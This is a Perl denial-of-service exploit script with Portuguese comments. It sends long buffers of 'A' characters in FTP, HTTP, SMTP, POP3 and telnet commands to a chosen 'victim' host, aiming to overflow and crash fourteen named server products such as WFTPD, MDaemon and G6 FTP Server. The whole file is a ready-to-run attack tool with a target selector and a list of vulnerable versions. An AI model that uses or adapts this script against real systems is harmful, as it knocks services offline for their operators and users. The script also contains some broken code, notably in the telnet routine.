#!/usr/bin/perl
#########################################################################
# Baseado em advisories de USSR (www.ussrback.com) & Rewted.org	      #
#								    #
# Script que demonstra como causar remotamente buffer overflow em varios#
# server, ocasionando denial of service.                                #
# Executar em *nix & Windows com perl.				    #
#								    #
# G6 FTP Server          v2.0 beta4/5				    #
# MDaemon httpd Server   v2.8.5.0				    #
# Avirt Mail Server      v3.5					    #
# BisonWare FTP Server   v3.5					    #
# Vermillion FTP Server  v1.23					    #
# ZetaMail POP3 Server   v2.1					    #
# WFTPD FTP Server       2.40					    #
# BFTelnet Server        v1.1					    #
# Broker FTP Server      v3.5				            #
# ExpressFS  FTP server  v2.x					    #
# XtraMail POP3 Server   v1.11					    #
# Cmail SMTP Server      v2.4	                                    #
# PakMail SMTP/POP3	 v1.25			                    #
#								    #
# slackette - warminx@null.rewted.org				    #
# www.rewted.org www.rewted.org www.rewted.org www.rewted.org 	    #
#####################################################################

use IO::Socket;
use Getopt::Std;
getopts('h:p:t:u:v', \%args);
if(!defined($args{h}) && !defined($args{t})) { 
print  qq~Usar:    $0 -h <vitima> -t <numero> ((-u username) | (-p password)) | -v

	-h vitima para testar DoS overflow remoto
	-t tipo de server (checar a opção -v para listar)
	-u username autorizado (necessário se retornar prompts para username)
	-p password autenticado (necessário se user/passwd são esperados)
	-v lista todos servidores vulneraveis para cada DoS

~; exit; }

if(defined($args{u})) { $user=$args{u}; }
if(defined($args{p})) { $pass=$args{p}; }
if(defined($args{v})) { &vulnerable; }
if(defined($args{h}) && defined($args{t})){
if(($args{t}) == 1)  { &G6;         }
if(($args{t}) == 2)  { &mdaemon;    }
if(($args{t}) == 3)  { &avirt;      }
if(($args{t}) == 4)  { &bisonware;  }
if(($args{t}) == 5)  { &vermillion; }
if(($args{t}) == 6)  { &zetamail;   }
if(($args{t}) == 7)  { &wftpd;      }
if(($args{t}) == 8)  { &bftelnet;   } 
if(($args{t}) == 9)  { &broker;     } 
if(($args{t}) == 10) { &expressfs;  } 
if(($args{t}) == 11) { &xtramail;   }
if(($args{t}) == 12) { &cmail;      }
if(($args{t}) == 13) { &pakmail;    } 
if(($args{t}) == 14) { &pakpop;     }}

sub G6 { 
$denial .= "A" x 2000;
$victim=$args{h};
	$socket = IO::Socket::INET->new (Proto => "tcp",
				  	 PeerAddr => $victim,
				  	 PeerPort => "21") or die "Não pode conectar.\n";
	$socket->autoflush(1);
print $socket "$denial\n"; # user
print "\nEnviar overflow para $victim\n";
close $socket; }

sub mdaemon {
$victim=$args{h};
$denial .= "A" x 1025;
$url = "/$denial";
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "80") or die "Não pode conectar.\n";
print $socket "GET $url\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub avirt { 
$victim=$args{h};
$denial .= "A" x 856;
	$socket = IO::Socket::INET->new (Proto => "tcp",
			                 PeerAddr => $victim,
                			 PeerPort => "25") or die "Não pode conectar.\n";
        $socket->autoflush(1);
print $socket "user $user\n";
print $socket "pass $denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub bisonware {
$victim=$args{h};
$denial .= "A" x 2000;
	$socket = IO::Socket::INET->new (Proto => "tcp",
			                 PeerAddr => $victim,
                			 PeerPort => "21") or die "Não pode conectar.\n";
        $socket->autoflush(1);
print $socket "$denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub vermillion {
$victim=$args{h};
$denial .= "A" x 504;
	$socket = IO::Socket::INET->new (Proto => "tcp",
			                 PeerAddr => $victim,
                			 PeerPort => "21") or die "Não pode conectar.\n";
        $socket->autoflush(1);
print $socket "$user\n";
print $socket "$pass\n";
print $socket "cwd $denial\n";
# for(i=0; i<=3; i++) { print $socket "CWD $denial\n"; }
print "\nEnviar overflow para $victim\n";
close $socket; }

sub zetamail {
$victim=$args{h};
$denial .= "A" x 3500;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "110") or die "Não pode conectar.\n";
print $socket "user $denial\n"; 
print $socket "pass $denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub wftpd {
$victim=$args{h};
$denial .= "A" x 255;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "21") or die "Não pode conectar.\n";
print $socket "$user\n";
print $socket "$pass\n";
print $socket "MKDIR $denial\n";
print $socket "CWD $denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub bftelnet {
# use Net::Telnet;
$victim=$args{h};
$denial .= "A" x 3090;
$telnet = new Net::Telnet ( Timeout =>10,
			    Errmode =>'die');
$telnet->open('$victim');
$telnet->waitfor('/Login: $/i');
$telnet->print('$denial');
print "\nEnviar overflow para $victim\n";
close $telnet; }

sub broker {
$victim=$args{h};
$denial .= "A" x 2730;
	$socket = IO::Socket::INET->new (Proto => "tcp",
			                 PeerAddr => $victim,
                			 PeerPort => "21") or die "Não pode conectar.\n";
print $socket "$denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }


sub expressfs {
$victim=$args{h};
$denial .= "A" x 654;
	$socket = IO::Socket::INET->new (Proto => "tcp",
			                 PeerAddr => $victim,
                			 PeerPort => "21") or die "Não pode conectar.\n";
print $socket "$denial\n";
print $socket "AAAAAAAAAAAAAAAAAAA\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub xtramail {
$victim=$args{h};
$denial .= "A" x 2930;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "25") or die "Não pode conectar.\n";
print $socket "MAIL DE: test\@localhost\n";
print $socket "RCPT PARA: $denial\@localhost\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub cmail {
$victim=$args{h};
$denial .= "A" x 7090;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "25") or die "Não pode conectar.\n";
print $socket "MAIL DE: $denial\@localhost\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub pakmail {
$victim=$args{h};
$denial .= "A" x 1390;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "25") or die "Não pode conectar.\n";
print $socket "MAIL DE: test\@localhost\n";
print $socket "RCPT PARA: $denial\@localhost\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub pakpop {
$victim=$args{h};
$denial .= "A" x 1400;
	$socket = IO::Socket::INET->new (Proto => "tcp",
					 PeerAddr => $victim,
					 PeerPort => "110") or die "Não pode conectar.\n";
print $socket "user testado\n";
print $socket "pass $denial\n";
print "\nEnviar overflow para $victim\n";
close $socket; }

sub vulnerable {
print qq~
 ______________________________________________________________________________
    Vulnerable Daemon        Versão         Vulnerable Daemon         Versão
 ______________________________________________________________________________

 [1] G6 FTP Server           v2.0b4/5     [2] MDaemon httpd Server     v2.8.5.0

 [3] Avirt Mail Server       v3.5         [4] BisonWare FTP Server     v3.5

 [5] Vermillion FTP Server   v1.23        [6] ZetaMail SMTP Server     v2.1

 [7] WFTPD FTP Server        v2.40        [8] BFTelnet Server          v1.1

 [9] Broker FTP Server       v3.5        [10] ExpressFS FTP Server     v2.x 

[11] XtraMail POP3 Server    v1.11       [12] Cmail SMTP Server        v2.4

[13] PakMail SMTP Server     v1.25       [14] PakMail POP3 Server      v1.25

~; exit; }